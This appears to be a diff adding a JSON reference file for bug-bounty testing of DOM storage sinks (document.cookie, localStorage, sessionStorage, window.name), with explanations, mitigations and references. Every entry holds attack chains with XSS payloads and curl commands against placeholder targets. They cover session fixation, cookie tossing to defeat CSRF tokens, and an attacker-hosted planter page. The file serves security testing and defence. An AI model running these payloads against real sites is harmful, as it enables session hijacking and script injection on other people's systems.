@@ -1,0 +1,371 @@
+{
+  "category": "storage",
+  "schema_version": "2.0",
+  "sinks": [
+    {
+      "id": "sink-document-cookie",
+      "name": "document.cookie",
+      "category": "storage",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "document.cookie",
+        ".cookie",
+        "cookie"
+      ],
+      "severity": "P4",
+      "severity_note": "P3 when tainted data overwrites a session/auth cookie (session fixation, token injection) or when cookie tossing on a sibling subdomain poisons the parent domain; P5 for non-security cookies (UI preferences).",
+      "explain": "Assigning document.cookie = 'name=value' sets a cookie from JavaScript. When the cookie name or value comes from a tainted source (URL, postMessage, storage), an attacker controls a cookie that the browser will send with every subsequent request — enabling session fixation, CSRF-token injection, and preference-cookie attacks that flip server-side behavior.",
+      "how_it_works": "Cookies set via document.cookie obey the same scoping rules as server-set ones: path and domain attributes decide where they travel. Two weapons follow. First, direct injection: tainted value lands in a cookie the server trusts (e.g. a CSRF token or session id the server does not re-validate). Second, cookie tossing: from any subdomain you can set Domain=.target.com cookies; browsers send both the attacker's cookie and the legitimate one, and many servers take the first — letting a less-trusted subdomain shadow a parent-domain cookie.",
+      "why_it_matters": "Cookie writes are the quiet end of the kill chain: one document.cookie assignment can pin a victim to an attacker-known session (fixation), desync CSRF tokens, or persist tainted state that a later server-side template renders without escaping.",
+      "exploitable_when": [
+        "location.search",
+        "location.hash",
+        "postMessage-data",
+        "localStorage"
+      ],
+      "chains": [
+        {
+          "source": "location.search",
+          "steps": [
+            {
+              "action": "Confirm a query parameter flows into a document.cookie assignment",
+              "payload": "?theme=jlf-trace",
+              "command": "open 'https://TARGET/page?theme=jlf-trace' in a browser",
+              "indicator": "document.cookie in the DevTools console shows a cookie containing jlf-trace"
+            },
+            {
+              "action": "Overwrite a security-relevant cookie with an attacker-known value",
+              "payload": "?theme=x;sessionid=SESSION_ID",
+              "command": "open 'https://TARGET/page?theme=x;sessionid=SESSION_ID' then run document.cookie in the console",
+              "indicator": "the sessionid cookie now holds the attacker-known SESSION_ID — if the server accepts it, the victim is fixed to the attacker's session"
+            },
+            {
+              "action": "Verify server-side trust in the injected cookie",
+              "payload": "Cookie: sessionid=SESSION_ID",
+              "command": "curl -s -H 'Cookie: sessionid=SESSION_ID' 'https://TARGET/account' | grep -i 'YOUR_ACCOUNT'",
+              "indicator": "the response renders the account tied to SESSION_ID, proving the server trusts client-writable cookie values"
+            }
+          ],
+          "eligibility": "Session fixation via client-writable cookies is accepted when the server fails to rotate/validate the session id; injection into purely cosmetic cookies (theme, language) is informational unless chained to a stored injection."
+        },
+        {
+          "source": "localStorage",
+          "steps": [
+            {
+              "action": "Demonstrate cookie tossing from a sibling subdomain",
+              "payload": "document.cookie='csrftoken=ATTACKER; Domain=.TARGET; Path=/'",
+              "command": "run the payload in the console on any subdomain of TARGET, then open 'https://TARGET/' and inspect document.cookie",
+              "indicator": "the browser now sends two csrftoken cookies to TARGET and the shadowed value appears first in the Cookie request header"
+            },
+            {
+              "action": "Confirm the server accepts the tossed cookie value",
+              "payload": "POST /form with attacker csrftoken",
+              "command": "curl -s -b 'csrftoken=ATTACKER' -d 'csrfmiddlewaretoken=ATTACKER&field=1' 'https://TARGET/form'",
+              "indicator": "the form is accepted with the attacker-chosen token, showing the CSRF defense is defeated by the tossed cookie"
+            }
+          ],
+          "eligibility": "Cookie tossing that defeats CSRF or session integrity is accepted on most platforms; requires control of any subdomain (takeover, XSS, or a subdomain in scope)."
+        }
+      ],
+      "contexts": {
+        "html-body": "The cookie string itself is not rendered; impact comes from which cookie you overwrite and how the server or another page consumes it.",
+        "attr": "Inject attributes into the cookie string: 'name=value; Domain=.TARGET; Path=/' widens scope; note that HttpOnly cookies cannot be read but CAN be shadowed by a same-name non-HttpOnly cookie from a subdomain.",
+        "js-string": "If the value is concatenated into a string, break out of the value with ';' to append a second cookie: x;sessionid=SESSION_ID."
+      },
+      "waf_notes": "Cookie writes happen client-side; a WAF only sees the resulting Cookie header on later requests. Odd or duplicated Cookie headers in logs are the detection signal.",
+      "eligibility": "Honest line: writing a cookie is only as severe as what trusts it. Session fixation, CSRF-token injection, and cross-subdomain tossing are reportable; tainted data into a preference cookie with no downstream consumer is informational.",
+      "mitigations": [
+        "Never build cookie strings from untrusted input; validate names and values against an allowlist",
+        "Mark session cookies HttpOnly, Secure, SameSite=Lax/Strict, and rotate session ids at login",
+        "Use the __Host- prefix (Secure, Path=/, no Domain) so subdomains cannot shadow the cookie",
+        "Server-side: reject duplicate cookie names instead of silently taking the first"
+      ],
+      "related": [
+        "localStorage",
+        "sessionStorage",
+        "window.name",
+        "location.href"
+      ],
+      "references": [
+        "PortSwigger: DOM-based cookie manipulation",
+        "OWASP: Session Fixation",
+        "HackTricks: Cookie Tossing"
+      ]
+    },
+    {
+      "id": "sink-localstorage",
+      "name": "localStorage",
+      "category": "storage",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "localStorage",
+        "localStorage.setItem",
+        "localStorage.getItem",
+        "window.localStorage"
+      ],
+      "severity": "P5",
+      "severity_note": "P5 for the write alone. Jumps to P2/P3 as a SECOND-ORDER chain when a stored value is later read and passed to innerHTML/eval/location.href — the read side is the real sink.",
+      "explain": "localStorage.setItem(k, v) persists attacker-influenced data in the origin's long-term store (survives restarts, shared across all tabs of the origin). The write itself executes nothing — localStorage is a taint WAREHOUSE: the vulnerability detonates later, when another code path does localStorage.getItem(k) and feeds the value into a dangerous sink.",
+      "how_it_works": "This is the classic source/sink pairing of second-order DOM XSS. Write side: ?name=payload -> localStorage.setItem('name', payload). Read side (different page, different session, maybe different user role): el.innerHTML = localStorage.getItem('name'). Because the store is persistent and origin-wide, the write and read can be separated by days and by pages, which is exactly why reviewers miss the chain: each half looks harmless alone.",
+      "why_it_matters": "Stored DOM XSS via localStorage is self-healing against server fixes: even after the reflected parameter is patched, the poisoned value keeps detonating from the store until cleared. It is also the standard persistence mechanism for XSS worms and session-token theft.",
+      "exploitable_when": [
+        "location.search",
+        "location.hash",
+        "postMessage-data",
+        "xhr-response",
+        "fetch-response"
+      ],
+      "chains": [
+        {
+          "source": "location.search",
+          "steps": [
+            {
+              "action": "Confirm tainted data is written to localStorage",
+              "payload": "?name=jlf-trace",
+              "command": "open 'https://TARGET/page?name=jlf-trace' then run localStorage in the DevTools console",
+              "indicator": "a localStorage entry contains jlf-trace, proving the write half of the chain"
+            },
+            {
+              "action": "Plant the payload and hunt the read side",
+              "payload": "?name=<img src=x onerror=alert(document.domain)>",
+              "command": "grep -n 'localStorage.getItem' app.js -A2 | grep -n 'innerHTML\\|eval\\|location\\|write'",
+              "indicator": "a getItem result flows into innerHTML/eval/location.href on some page of the same origin"
+            },
+            {
+              "action": "Trigger the second-order detonation",
+              "payload": "?name=<img src=x onerror=alert(document.domain)>",
+              "command": "open 'https://TARGET/page?name=<img src=x onerror=alert(document.domain)>' to plant it, then open the page that performs the unsafe getItem",
+              "indicator": "alert(document.domain) fires on the READ page with no tainted parameter in its URL — proving stored second-order XSS"
+            }
+          ],
+          "eligibility": "Accepted as stored DOM XSS when both halves are demonstrated. A localStorage write with NO unsafe read path is informational only — always find the read-side sink before reporting."
+        },
+        {
+          "source": "fetch-response",
+          "steps": [
+            {
+              "action": "Identify an API response field that is cached into localStorage and later rendered",
+              "payload": "{\"displayName\":\"<img src=x onerror=alert(document.domain)>\"}",
+              "command": "curl -s -X PATCH -H 'Content-Type: application/json' -d '{\"displayName\":\"<img src=x onerror=alert(document.domain)>\"}' 'https://TARGET/api/profile' --cookie 'session=SESSION_ID'",
+              "indicator": "a GET of https://TARGET/api/profile returns the payload unencoded in the displayName field"
+            },
+            {
+              "action": "Trigger the localStorage cache and the unsafe read",
+              "payload": "<img src=x onerror=alert(document.domain)>",
+              "command": "open 'https://TARGET/dashboard' in a browser, confirm via localStorage in the console that the payload was cached, then navigate to the page that renders it",
+              "indicator": "alert(document.domain) fires from the stored value with no payload in the current URL — stored second-order XSS via fetch-to-localStorage"
+            }
+          ],
+          "eligibility": "API-to-localStorage-to-DOM is full stored XSS and accepted at XSS severity; confirm the API field lacks server-side encoding to rule out a pure server-side stored XSS duplicate."
+        }
+      ],
+      "contexts": {
+        "html-body": "Read side into innerHTML: stored <img src=x onerror=alert(document.domain)> detonates on every visit until cleared.",
+        "attr": "Read side into an attribute: store a javascript: URL or an attribute-breakout string.",
+        "js-string": "Read side into eval/setTimeout: store ';alert(document.domain)// style breakout content."
+      },
+      "waf_notes": "The write request may pass a WAF if the payload arrives via a parameter the WAF does not inspect (fragment, JSON body). Once stored, every detonation is client-side with zero server traffic.",
+      "eligibility": "The write is never the finding — the pairing is. Storage-only findings without a demonstrated detonation path are informational on every major platform.",
+      "mitigations": [
+        "Treat localStorage.getItem output as exactly as untrusted as location.search — sanitize before any DOM sink",
+        "Prefer keeping render data in memory or fetching it fresh over re-rendering from storage",
+        "Never store session tokens in localStorage (readable by any XSS on the origin); use HttpOnly cookies"
+      ],
+      "related": [
+        "sessionStorage",
+        "document.cookie",
+        "innerHTML",
+        "eval"
+      ],
+      "references": [
+        "PortSwigger: DOM-based vulnerabilities using client-side storage",
+        "OWASP WSTG: Testing for Client-side Storage",
+        "OWASP: HTML5 Security Cheat Sheet"
+      ]
+    },
+    {
+      "id": "sink-sessionstorage",
+      "name": "sessionStorage",
+      "category": "storage",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "sessionStorage",
+        "sessionStorage.setItem",
+        "sessionStorage.getItem",
+        "window.sessionStorage"
+      ],
+      "severity": "P5",
+      "severity_note": "P5 for the write alone; P3 as a second-order chain within the same tab session. Narrower than localStorage because the store dies with the tab and is not shared across tabs.",
+      "explain": "sessionStorage is the per-tab, per-session twin of localStorage: data lives only for the lifetime of the tab and is isolated between tabs. Writes are inert; the danger is the same second-order pattern — a tainted value stored now is read later in the same tab and fed into a dangerous sink.",
+      "how_it_works": "Write side: a URL parameter or postMessage payload is cached via sessionStorage.setItem. Read side: a later navigation INSIDE THE SAME TAB (SPA route change, multi-step wizard, payment flow) reads the key and renders it unsafely. Because the store is tab-local, cross-tab amplification is impossible, but within a tab the stored value survives every same-tab navigation — ideal for payload delivery across wizard steps.",
+      "why_it_matters": "Multi-step flows (checkout, onboarding) frequently carry state in sessionStorage between steps; one tainted write in step 1 can detonate in step 4's template, far from the injection point and invisible to server logs.",
+      "exploitable_when": [
+        "location.search",
+        "location.hash",
+        "postMessage-data",
+        "spa-hash-router-param"
+      ],
+      "chains": [
+        {
+          "source": "location.search",
+          "steps": [
+            {
+              "action": "Confirm tainted data is written to sessionStorage",
+              "payload": "?ref=jlf-trace",
+              "command": "open 'https://TARGET/page?ref=jlf-trace' then run sessionStorage in the DevTools console",
+              "indicator": "a sessionStorage entry contains jlf-trace, proving the write half"
+            },
+            {
+              "action": "Locate the same-tab read side and plant the payload",
+              "payload": "?ref=<img src=x onerror=alert(document.domain)>",
+              "command": "grep -n 'sessionStorage.getItem' app.js -A2 | grep -n 'innerHTML\\|eval\\|location'",
+              "indicator": "a getItem result reaches a DOM/execution sink during a later same-tab step"
+            },
+            {
+              "action": "Walk the same-tab flow to the detonation point",
+              "payload": "?ref=<img src=x onerror=alert(document.domain)>",
+              "command": "open 'https://TARGET/page?ref=<img src=x onerror=alert(document.domain)>' then continue the in-tab flow (wizard steps or SPA route) to the reading page",
+              "indicator": "alert(document.domain) fires on the later step with no tainted parameter in its URL"
+            }
+          ],
+          "eligibility": "Accepted as stored-in-session DOM XSS when the full same-tab chain is shown; write-only or console-only reads are informational."
+        },
+        {
+          "source": "spa-hash-router-param",
+          "steps": [
+            {
+              "action": "Store the payload via the router parameter",
+              "payload": "#/settings?theme=jlf-trace",
+              "command": "open 'https://TARGET/app#/settings?theme=jlf-trace' and inspect sessionStorage",
+              "indicator": "the tainted router value lands in sessionStorage under a predictable key"
+            },
+            {
+              "action": "Detonate on the read side",
+              "payload": "payload appropriate to the read-side sink (e.g. <img src=x onerror=alert(1)>)",
+              "command": "navigate to the page that reads the stored key into innerHTML (keep the same tab session)",
+              "indicator": "stored value renders unencoded — second-order XSS fires"
+            }
+          ],
+          "eligibility": "Second-order storage XSS is accepted on major platforms when you show the full write->read->detonate path in one session. Storage write alone without a sink is Informational."
+        }
+      ],
+      "contexts": {
+        "html-body": "Read side into innerHTML: stored <img src=x onerror=alert(document.domain)>.",
+        "attr": "Read side into an attribute: javascript: URL or breakout string.",
+        "js-string": "Read side into eval: ';alert(document.domain)// breakout."
+      },
+      "waf_notes": "Same blindness as localStorage, plus the store never crosses the network at all — there is no server artifact of the stored payload.",
+      "eligibility": "Same rule as localStorage: the pairing is the finding. Tab isolation makes cross-victim impact harder to demonstrate, so document the exact same-tab navigation path in the report.",
+      "mitigations": [
+        "Sanitize sessionStorage reads before any DOM sink — same-tab storage is not a trust boundary",
+        "Pass wizard state server-side or via signed tokens instead of client storage",
+        "Clear sensitive sessionStorage keys on logout/route exit"
+      ],
+      "related": [
+        "localStorage",
+        "window.name",
+        "innerHTML",
+        "document.cookie"
+      ],
+      "references": [
+        "PortSwigger: DOM-based vulnerabilities using client-side storage",
+        "OWASP WSTG: Testing for Client-side Storage",
+        "MDN: Window.sessionStorage"
+      ]
+    },
+    {
+      "id": "sink-window-name",
+      "name": "window.name",
+      "category": "storage",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "window.name",
+        "name =",
+        "window.name="
+      ],
+      "severity": "P4",
+      "severity_note": "P3 when window.name is read into a DOM/execution sink — it is the one client-side store that survives CROSS-ORIGIN navigation, so any attacker page can plant it.",
+      "explain": "window.name is a string property of the browsing context that — uniquely among client-side stores — persists across navigations INCLUDING cross-origin ones. A page that writes window.name = tainted data, or one that reads window.name into a sink, is dealing with a value any previously-visited website could have planted.",
+      "how_it_works": "The name belongs to the tab, not the origin. Attack: attacker.com sets window.name = payload then does location = 'https://TARGET/page'. The navigation crosses origins but the tab keeps its name; TARGET's code reads window.name and writes it to innerHTML — the payload detonates in TARGET's origin. No parameter, no storage permission, no server log. Historically window.name was also abused as a cross-domain transport, so legacy code often treats it as trusted.",
+      "why_it_matters": "It is the stealthiest DOM XSS source: the payload arrives via a navigation that looks completely clean in TARGET's access logs (no query string, no fragment, a same-site referrer or none), which defeats both WAFs and incident response.",
+      "exploitable_when": [
+        "window.name"
+      ],
+      "chains": [
+        {
+          "source": "window.name",
+          "steps": [
+            {
+              "action": "Confirm the target reads window.name into a sink",
+              "payload": "window.name",
+              "command": "grep -n 'window.name' app.js -A2 | grep -n 'innerHTML\\|eval\\|write\\|location'",
+              "indicator": "window.name flows into innerHTML/eval/document.write/location.href without sanitization"
+            },
+            {
+              "action": "Build a planter page that sets window.name and navigates to the target",
+              "payload": "<script>window.name='<img src=x onerror=alert(document.domain)>';location='https://TARGET/page'</script>",
+              "command": "host at https://ATTACKER/plant.html and open it in a browser",
+              "indicator": "the browser lands on https://TARGET/page and alert(document.domain) fires — the payload crossed origins inside window.name"
+            },
+            {
+              "action": "Prove no server-side trace exists",
+              "payload": "<script>window.name='<img src=x onerror=alert(document.domain)>';location='https://TARGET/page'</script>",
+              "command": "curl -s 'https://TARGET/page' -o /dev/null -w '%{http_code}\\n' and compare with the access log for the victim request",
+              "indicator": "the victim's request to TARGET contained no payload in path or query — confirming server-side controls cannot see this vector"
+            }
+          ],
+          "eligibility": "window.name DOM XSS is accepted on major platforms because the cross-origin planting is fully attacker-controlled; note in the report that the attack requires the victim to visit the planter page first (one-click or drive-by)."
+        },
+        {
+          "source": "window.name",
+          "steps": [
+            {
+              "action": "Plant the payload in window.name from an attacker page",
+              "payload": "window.name = '<img src=x onerror=alert(1)>'; location = 'https://TARGET/page'",
+              "command": "host poc.html on https://ATTACKER that sets window.name then navigates to the target",
+              "indicator": "after cross-origin navigation, the target reads window.name — your payload survived"
+            },
+            {
+              "action": "Confirm detonation in the target's sink",
+              "payload": "same payload",
+              "command": "watch the target page render",
+              "indicator": "payload executes in the TARGET origin — full cross-origin DOM XSS"
+            }
+          ],
+          "eligibility": "window.name XSS is a well-accepted vector (survives cross-origin navigation). Rate it like any DOM XSS (P2-P3) when the sink read is shown."
+        }
+      ],
+      "contexts": {
+        "html-body": "window.name into innerHTML: <img src=x onerror=alert(document.domain)>.",
+        "attr": "window.name into an attribute: javascript: URL or breakout.",
+        "js-string": "window.name into eval: ';alert(document.domain)//."
+      },
+      "waf_notes": "The definitive WAF-blind vector: the payload never appears in any HTTP request to the target. Only client-side defenses (CSP on the final sink, sanitization) can stop it.",
+      "eligibility": "Reportable DOM XSS when a sink pairing exists. A page that only WRITES window.name from tainted data is a taint carrier, not a finding, until you find a page that reads it unsafely (often a different page of the same app).",
+      "mitigations": [
+        "Never read window.name into a DOM or execution sink; treat it as attacker-controlled on every page load",
+        "If window.name must be used (legacy transport), validate its exact expected format before use and clear it afterwards",
+        "Modern replacement: use sessionStorage or postMessage with origin checks instead of window.name transport"
+      ],
+      "related": [
+        "localStorage",
+        "sessionStorage",
+        "document.cookie",
+        "innerHTML"
+      ],
+      "references": [
+        "PortSwigger: DOM-based vulnerabilities using window.name",
+        "HackTricks: window.name XSS",
+        "MDN: Window.name"
+      ]
+    }
+  ]
+}
